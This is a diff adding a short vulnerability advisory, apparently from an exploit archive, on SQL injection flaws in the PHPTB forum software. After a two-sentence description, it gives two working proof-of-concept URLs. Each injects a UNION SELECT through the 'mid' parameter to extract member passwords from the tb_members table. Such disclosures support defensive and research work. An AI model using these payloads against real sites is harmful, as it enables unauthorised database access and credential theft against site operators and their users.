@@ -1,0 +1,8 @@
+source: http://www.securityfocus.com/bid/14535/info
+
+PHPTB is prone to multiple SQL injection vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input before using it in SQL queries.
+
+The consequences of this attack may vary depending on the type of queries that can be influenced, and the implementation of the database. 
+
+http://www.example.com/PHPTB/index.php?sid=cc3de2fc8c2b357b6a6d46ea8aa92a32&act=profile&mid=-99%20UNION%20SELECT%20null,password,password,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null%20FROM%20tb_members%20WHERE%20user_id=1
+http://www.example.com/PHPTB/index.php?sid=a284c075e8b0073935ba7290ca0dade8&act=newpm&mid=-99%20UNION%20SELECT%20password%20FROM%20tb_members%20WHERE%20user_id=1 
